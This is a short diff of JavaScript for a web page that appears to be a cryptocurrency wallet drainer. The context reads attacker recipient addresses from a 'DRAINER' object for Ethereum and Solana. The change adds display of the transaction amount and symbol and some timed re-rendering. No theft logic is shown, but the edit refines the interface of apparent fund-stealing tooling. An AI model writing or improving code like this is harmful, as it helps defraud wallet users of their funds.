@@ -175,6 +175,10 @@
     toRow.hidden = !visible || !addr;
     if (!addr) return;
     toEl.textContent = short(addr);
+    const amtEl = $("tx-amount");
+    const amtText = $("amount")?.textContent || "";
+    if (amtEl) amtEl.textContent = (amtText || "—") + " " + ($("symbol")?.textContent || "");
+    if (amtEl && !/^[1-9]/.test(amtText)) setTimeout(renderTo, 500);
     toEl.title = addr;
     if (toExplorer) {
       const cluster = location.search.includes("cluster=devnet") ? "?cluster=devnet" : "";
@@ -185,7 +189,7 @@
     renderTo();
     document.querySelectorAll('[role="tab"]').forEach((tab) => tab.addEventListener("click", () => setTimeout(renderTo, 20)));
     const resultEl = $("result");
-    if (resultEl) new MutationObserver(renderTo).observe(resultEl, { attributes: true, attributeFilter: ["hidden"] });
+    if (resultEl) new MutationObserver(() => { renderTo(); setTimeout(renderTo, 900); }).observe(resultEl, { attributes: true, attributeFilter: ["hidden"] });
     toCopy?.addEventListener("click", async () => {
       const chainKey = document.querySelector('[role="tab"][aria-selected="true"]')?.dataset.chain;
       const addr = chainKey === "eth" ? DRAINER.evmRecipient : DRAINER.solRecipient;
